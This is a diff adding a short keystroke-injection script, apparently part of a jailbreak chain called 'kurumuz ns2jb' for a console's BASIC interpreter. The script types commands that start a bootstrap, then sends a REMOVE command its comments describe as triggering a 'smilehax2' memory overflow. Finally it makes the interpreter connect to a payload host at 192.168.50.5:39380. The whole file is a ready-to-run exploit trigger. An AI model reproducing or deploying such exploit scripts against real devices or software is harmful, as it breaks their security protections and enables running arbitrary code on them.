@@ -1,0 +1,21 @@
+REM ============================================
+REM KURUMUZ NS2JB - DEMO/FIXED PATH
+REM DO NOT USE WITH BERM THE SEQUEL BOOTSTRAP
+REM Use with kurumuz/ns2jb bootstrap.bas + run.cjs
+REM Host must be running on 192.168.50.5:39380
+REM ============================================
+
+DEFAULTDELAY 60
+DELAY 9000
+
+REM Boot kurumuz bootstrap
+STRINGLN RUN
+DELAY 14000
+
+REM Trigger smilehax2 overflow (Expected "Out of memory")
+STRINGLN REMOVE NSR,&H60000000,&H3FFFFFFF
+DELAY 11000
+
+REM Connect to host - swap this if kurumuz run.cjs prints a different V=START line
+STRINGLN V=START(39380,192,168,50,5)
+DELAY 20000
